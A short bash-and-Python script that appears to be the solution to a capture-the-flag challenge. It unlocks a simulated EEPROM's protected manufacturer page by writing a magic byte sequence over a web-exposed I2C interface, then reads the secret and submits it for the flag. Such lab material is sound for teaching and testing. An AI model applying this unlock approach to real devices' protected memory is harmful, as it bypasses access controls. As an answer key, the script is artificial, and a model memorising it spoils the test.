#!/usr/bin/env bash
set -euo pipefail
mkdir -p /app

python3 - << 'EOF'
import requests

BASE = "http://target:8108"

def write(addr, data):
    r = requests.post(f"{BASE}/i2c/write", json={"addr": addr, "data": data}, timeout=10)
    return r.json()

def read(addr):
    r = requests.post(f"{BASE}/i2c/read", json={"addr": addr}, timeout=10)
    return r.json()["data"]

print("[*] Probing public EEPROM addresses 0x00-0x03...")
for a in range(4):
    print(f"    addr 0x{a:02X} = 0x{read(a):02X}")

print("[*] Probing locked manufacturer page 0x80 (should be 0xFF)...")
print(f"    addr 0x80 = 0x{read(0x80):02X}  (locked)")

print("[*] Sending unlock sequence: write 0xA5→0xFE, write 0x5A→0xFF")
write(0xFE, 0xA5)
write(0xFF, 0x5A)

print("[*] Reading manufacturer page 0x80-0x83...")
secret_bytes = [read(0x80 + i) for i in range(4)]
secret = "".join(f"{b:02X}" for b in secret_bytes)
print(f"[+] Secret: 0x{secret}")

r = requests.post(f"{BASE}/flag", json={"secret": secret}, timeout=10)
resp = r.json()
if "flag" not in resp:
    print(f"[!] Error: {resp}")
    import sys; sys.exit(1)

flag = resp["flag"]
print(f"[+] flag: {flag}")
with open("/app/flags.txt", "w") as f:
    f.write(flag + "\n")
print("[+] written to /app/flags.txt")
EOF
